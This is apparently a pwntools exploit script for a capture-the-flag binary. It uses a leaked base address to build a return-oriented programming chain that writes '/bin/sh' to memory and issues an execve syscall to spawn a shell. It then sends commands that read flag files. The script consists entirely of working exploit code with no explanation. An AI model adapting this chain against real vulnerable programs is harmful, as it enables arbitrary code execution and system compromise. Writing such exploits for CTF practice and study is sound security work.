#!/usr/bin/env python3

from pwn import *
import codecs
import warnings

if args.SWARM:
    context.log_level = "ERROR"

exe = ELF("./ldd-000_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]
warnings.filterwarnings("ignore", category=BytesWarning)

def debug():
    if args.GDB_DEBUG:
        gdb.attach(p, '''
        c
        ''')
        pause()

def conn():
    if args.LOCAL:
        p = process([exe.path])
    else:
        p = remote("addr", 1337)
    return p

p = conn()

p.recvuntil("=")
base = int(p.recvline().strip(), 16)

pop_rdi_rbp = base + 0x00000000000025ac
pop_rsi_rbp = base + 0x00000000000059ab
mov_rdx_rbx = base + 0x000000000000e2bb
pop_rbx_r12_rbp = base + 0x0000000000025d33
mov_qword_rsi_rax = base + 0x00000000000141e5
pop_rax = base + 0x000000000001548a
bss = base + 0x381f0

payload = b"A"*0x18 + p64(pop_rsi_rbp) + p64(bss)*2 + p64(pop_rax) + b"/bin/sh\0" + p64(mov_qword_rsi_rax) + p64(pop_rdi_rbp) + p64(bss)*2 + p64(pop_rsi_rbp) + p64(0)*2 + p64(pop_rbx_r12_rbp) + p64(0)*3 + p64(pop_rax) + p64(0x3b) + p64(mov_rdx_rbx)

p.sendline(payload)

debug()

if not args.SWARM:
    p.interactive()
else:
    # print out the flag to stdout
    p.sendline("cat ./flag*")
    p.sendline("cat /flag*")
    p.sendline("cat /home/*/flag*")
    print(p.recvall(timeout=3), flush=True)
